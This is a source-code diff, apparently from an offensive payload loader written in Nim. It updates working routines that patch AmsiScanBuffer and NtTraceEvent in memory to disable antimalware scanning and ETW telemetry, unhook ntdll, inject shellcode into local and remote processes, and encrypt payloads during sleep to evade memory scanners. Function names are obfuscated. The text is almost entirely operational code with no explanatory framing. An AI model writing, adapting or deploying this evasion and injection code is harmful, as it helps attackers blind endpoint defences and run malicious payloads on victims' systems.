@@ -26,33 +26,46 @@ proc PatchAmsi(): bool =
         disabled: bool = false
     
     when defined amd64:
-        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
-        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
-    amsi = MyLoadLibraryA(obf("amsi.dll"))
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+    when defined(DInvoke):
+        amsi = MyLoadLibraryA(obf("amsi.dll"))
+    else:
+        amsi = LoadLibraryA(obf("amsi.dll"))
     if (amsi == 0):
         echo obf("[X] Failed to load amsi.dll")
         return disabled
 
-    cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
+    when defined(DInvoke):
+        cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
+    else:
+        cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
     if isNil(cs):
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     
+    cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+
     var oldProtection: DWORD = 0
 
     var success: BOOL
     var protectAddress = cs
     var friendlycodeLength = cast[SIZE_T](patch.len)
 
-    var pHandle: HANDLE = MyGetCurrentProcess()
+    when defined(DInvoke):
+        var pHandle: HANDLE = MyGetCurrentProcess()
+    else:
+        var pHandle: HANDLE = GetCurrentProcess()
         
     var 
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
 
 
-    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to change memory protections.")
@@ -96,49 +109,64 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
+        # two of the functions cause problems for --csharp and --syswhispers --jump at the moment
+        #PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
+        PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
     elif defined i386:
         let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
-    ntdll = MyLoadLibraryA(obf("ntdll"))
+    when defined(DInvoke):
+        ntdll = MyLoadLibraryA(obf("ntdll"))
+    else:
+        ntdll = LoadLibraryA(obf("ntdll"))
     if (ntdll == 0):
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
-    cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
-    if isNil(cs):
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
-        return disabled
+    for singleAPI in PatchAPIs:
+        echo obf("[*] Patching : "),singleAPI
+
+        when defined(DInvoke):
+            cs = MyGetProcAddress(ntdll,singleAPI)
+        else:
+            cs = GetProcAddress(ntdll,singleAPI)
+        if isNil(cs):
+            echo obf("[X] Failed to get the address of "), singleAPI
+            break
 
 
-    var hProcess: HANDLE
-    hProcess = MyGetCurrentProcess()
-    var oldProtection: DWORD = 0
-    var success: BOOL
+        var hProcess: HANDLE
+        when defined(DInvoke):
+            hProcess = MyGetCurrentProcess()
+        else:
+            hProcess = GetCurrentProcess()
+        var oldProtection: DWORD = 0
+        var success: BOOL
 
-    var protectAddress = cs
+        var protectAddress = cs
 
-    var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
-    if (success != 0):
-        echo obf("uashdiasdj failed")
-        return disabled
-    echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
-    var outLength: SIZE_T
+        var friendlycodeLength = cast[SIZE_T](patch.len)
+        success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        if (success != 0):
+            echo obf("uashdiasdj failed")
+            break
+        echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
+        var outLength: SIZE_T
     
-    success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
     
-    if (success != 0):
-        echo obf("oqiazasusjk failed")
-        return disabled
-    success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
-    if (success != 0):
-        echo obf("uashdiasdj failed")
-        return disabled
-    else:
-        echo obf("[*] OldProtect set back")
-        disabled = true
+        if (success != 0):
+            echo obf("oqiazasusjk failed")
+            break
+        success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+        if (success != 0):
+            echo obf("uashdiasdj failed")
+            break
+        else:
+            echo obf("[*] OldProtect set back")
+            disabled = true
     
 
     return disabled
@@ -150,12 +178,21 @@ when isMainModule:
 
 let WhispersUnhookStub * = """
 
+when not defined(DInvoke):
+    from winim import MODULEINFO,GetModuleInformation
+
 proc ntdllunhook(): bool =
   let low: uint16 = 0
+  when defined(DInvoke):
+    var processH = MyGetCurrentProcess()
+  else:
+    var processH = GetCurrentProcess()
+  when defined(DInvoke):
+      var ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
+  else:
+      var ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
   var 
-      processH = MyGetCurrentProcess()
       mi : MODULEINFO
-      ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
       ntdllBase : LPVOID
       ntdllFile : FileHandle
       ntdllMapping : HANDLE
@@ -164,14 +201,23 @@ proc ntdllunhook(): bool =
       hookedNtHeader : PIMAGE_NT_HEADERS
       hookedSectionHeader : PIMAGE_SECTION_HEADER
 
-  discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  when defined(DInvoke):
+      discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  else:
+        discard GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
   ntdllBase = mi.lpBaseOfDll
   ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
-  ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  when defined(DInvoke):
+      ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  else:
+        ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
   if ntdllMapping == 0:
     echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
     return false
-  ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  when defined(DInvoke):
+      ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  else:
+        ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
   if ntdllMappingAddress.isNil:
     echo obf("Could not map view of file ") & fmt"({GetLastError()})."
     return false
@@ -186,7 +232,7 @@ proc ntdllunhook(): bool =
           var bytesWritten: SIZE_T
           var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
-          status = uashdiasdj(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
           if status != 0:
             echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
@@ -201,7 +247,10 @@ proc ntdllunhook(): bool =
   status = zuatzuastdiasyy(processH)
   status = zuatzuastdiasyy(ntdllFile)
   status = zuatzuastdiasyy(ntdllMapping)
-  discard MyFreeLibrary(ntdllModule)
+  when defined(DInvoke):
+      discard MyFreeLibrary(ntdllModule)
+  else:
+      discard FreeLibrary(ntdllModule)
   return true
 
 
@@ -216,11 +265,30 @@ let WhispersLocalInjectStub*  = """
 
 proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =
 
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
+        g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+
     when defined(amd64):
 
-        let tProcess = MyGetCurrentProcessId()
-        var pHandle: HANDLE = MyGetCurrentProcess()
-        
+        when defined(DInvoke):
+            let tProcess = MyGetCurrentProcessId()
+            var pHandle: HANDLE = MyGetCurrentProcess()
+        else:
+            let tProcess = GetCurrentProcessId()
+            var pHandle: HANDLE = GetCurrentProcess()
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
@@ -327,9 +395,11 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
 
     when defined amd64:
-        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
-        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
 
     var disabled: bool = false
@@ -343,7 +413,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
     if RemoteProc == NULL:
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
-
+    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = RemoteProc
@@ -356,7 +426,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         buffer          : LPVOID
 
 
-    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -479,9 +549,9 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get ntdll.dll handle")
         return disabled
 
-    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
+    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("NtTraceEvent"))
     if RemoteProc == NULL:
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
+        echo obf("[X] Failed to get the address of 'NtTraceEvent'")
         return disabled
 
     var oldProtection: DWORD = 0
@@ -496,7 +566,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         buffer          : LPVOID
 
 
-    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -526,7 +596,10 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
     return disabled
 
 when isMainModule:
-    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    when defined(DInvoke):
+        var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    else:
+        var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchEtw(hProcetw)
     if (success == 0):
         success = remoteLoadNtdll(remoteProcID)
@@ -536,19 +609,6 @@ when isMainModule:
     
 """
 
-let WhispersNotepadProcIDStub * = """
-
-import osproc
-
-# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-let tProcess = startProcess(obf("notepad.exe"))
-tProcess.suspend() # That's handy!
-tProcess.close()
-
-echo obf("[*] Target Process: "), tProcess.processID
-var remoteProcID = DWORD(tProcess.processID)
-
-"""
 
 let WhispersShellcoderemoteinjectStub_notepad * = """
 proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
@@ -566,8 +626,12 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
 let WhispersShellcoderemoteinjectStub * = """
     
-    let tProcess2 = MyGetCurrentProcessId()
-    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    when defined(DInvoke):
+        let tProcess2 = MyGetCurrentProcessId()
+        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    else:
+        let tProcess2 = GetCurrentProcess()
+        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 
 
     var oldProtection: DWORD = 0
@@ -818,7 +882,10 @@ proc fixIAT*(modulePtr: PVOID): bool =
         elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
           boolvar = true
         if (boolvar):
-          var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+          when defined(DInvoke):
+              var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+          else:
+                var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
           fieldThunk.u1.Function = ULONGLONG(libaddr)
         if fieldThunk.u1.Function == 0:
           break
@@ -830,9 +897,12 @@ proc fixIAT*(modulePtr: PVOID): bool =
           var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
           
           let asd = byname.Name
-          var hmodule: HMODULE = MyLoadLibraryA(libname)
-          var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
-          
+          when defined(DInvoke):
+              var hmodule: HMODULE = MyLoadLibraryA(libname)
+              var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
+          else:
+                var hmodule: HMODULE = LoadLibraryA(libname)
+                var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
     
           fieldThunk.u1.Function = ULONGLONG(libaddr)
 
@@ -851,9 +921,12 @@ proc fixIAT*(modulePtr: PVOID): bool =
 
 proc pwndem(): void =
 
-    let tProcess2 = MyGetCurrentProcessId()
-    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-    
+    when defined(DInvoke):
+        let tProcess2 = MyGetCurrentProcessId()
+        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    else:
+        let tProcess2 = GetCurrentProcessId()
+        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
     var shellcodePtr: ptr = dectext[0].addr
 
     var pImageBase: ptr BYTE = nil
@@ -867,6 +940,22 @@ proc pwndem(): void =
     preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
     
     echo $ntHeader.OptionalHeader.SizeOfImage
+
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = unsafeAddr dectext[0].addr
+        g_fluctuationData.shellcodeSize = size_t($ntHeader.OptionalHeader.SizeOfImage)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
     
     var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
     var ds: LPVOID
